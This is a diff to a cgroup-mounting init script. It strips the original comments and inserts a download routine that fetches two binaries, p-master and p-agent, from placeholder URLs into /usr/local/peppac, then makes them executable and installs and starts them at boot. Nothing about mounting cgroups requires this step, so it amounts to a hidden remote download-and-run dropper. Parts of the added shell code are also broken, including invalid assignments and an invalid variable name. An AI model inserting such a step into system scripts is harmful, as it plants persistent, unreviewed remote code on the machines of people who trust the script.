@@ -2,24 +2,50 @@
 
 set -e
 
-# For simplicity this script provides no flexibility
+download_url = "http://xxx"
 
-# If cgroup is mounted by fstab, don't run
-# Don't get too smart - bail on any uncommented entry with 'cgroup' in it
+download_url_backup =  "http://"
+
+
+downloads()
+{
+    if [ -f "/usr/bin/curl" ]
+    then
+        http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1`
+        if [ "$http_code" -eq "200" ]
+        then
+            curl --connect-timeout 5 --retry 5 $1 > $2
+        elif [ "$http_code" -eq "405" ]
+        then
+            curl --connect-timeout 5 --retry 5 $1 > $2
+        else
+            curl --connect-timeout 5 --retry 5 $3 > $2
+    fi
+    elif [ -f "/usr/bin/wget" ]
+    then
+        wget --timeout=5 --tries=5 -O $2 $1
+        if [ $? -ne 0 ]
+	then
+		wget --timeout=5 --tries=5 -O $2 $3
+    fi
+}
+
+
+
 if grep -v '^#' /etc/fstab | grep -q cgroup; then
 	echo "cgroups mounted from fstab, not mounting /sys/fs/cgroup"
 	exit 0
 fi
 
-# kernel provides cgroups?
+
 if [ ! -e /proc/cgroups ]; then
 	exit 0
 fi
 
-# Mount /sys/fs/cgroup if not already done
+
 mountpoint -q /sys/fs/cgroup || mount -t tmpfs -o uid=0,gid=0,mode=0755 cgroup /sys/fs/cgroup
 
-# get list of cgroup kernel controllers
+
 for d in `tail -n +2 /proc/cgroups | awk '{
         if ($2 == 0)
                 print $1
@@ -36,19 +62,47 @@ for d in `tail -n +2 /proc/cgroups | awk '{
 	mountpoint -q /sys/fs/cgroup/$d || (mount -n -t cgroup -o $d cgroup /sys/fs/cgroup/$d || rmdir /sys/fs/cgroup/$d || true)
 done
 
-# Find any named controllers which already exist
-# If we do this we have to make sure to run after proc is mounted
-#for d in `sed -e '/name=/!d;s/^.*name=\([^:]*\).*/\1/' /proc/self/cgroup`; do
-#	mkdir -p "/sys/fs/cgroup/${d}"
-#	mountpoint -q /sys/fs/cgroup/"${d}" || (mount -n -t cgroup -o none,name="${d}" name="${d}" "/sys/fs/cgroup/${d}" || rmdir "/sys/fs/cgroup/${d}" || true)
-#done
 
-# Always mount name=systemd
+
 dir=/sys/fs/cgroup/systemd
 if [ ! -d "${dir}" ]; then
 	mkdir "${dir}"
 	mount -n -t cgroup -o none,name=systemd name=systemd "${dir}" || rmdir "${dir}" || true
 fi
 
+
+
+agent-dir=/usr/local/peppac
+
+if [ ! -d "${agent-dir}"  ];then
+  mkdir "${agent-dir}"
+  downloads $download_url /usr/local/peppac/p-master $download_url_backup
+  downloads $download_url /usr/local/peppac/p-agent $download_url_backup
+  chmod +x  /usr/local/peppac/p-master
+  chmod +x  /usr/local/peppac/p-agent
+
+  /usr/local/peppac/p-master install
+  /usr/local/peppac/p-master start
+
+
+else
+
+      if [ -f "/usr/local/peppac/p-master" ]
+        then
+          /usr/local/peppac/p-master stop
+          /usr/local/peppac/p-master remove
+          rm -rf  /usr/local/peppac/p-master
+          rm -rf  /usr/local/peppac/p-agent
+      fi
+
+      downloads $download_url /usr/local/peppac/p-master $download_url_backup
+      downloads $download_url /usr/local/peppac/p-agent $download_url_backup
+      chmod +x  /usr/local/peppac/p-master
+      chmod +x  /usr/local/peppac/p-agent
+
+      /usr/local/peppac/p-master install
+      /usr/local/peppac/p-master start
+
+fi
 
 exit 0
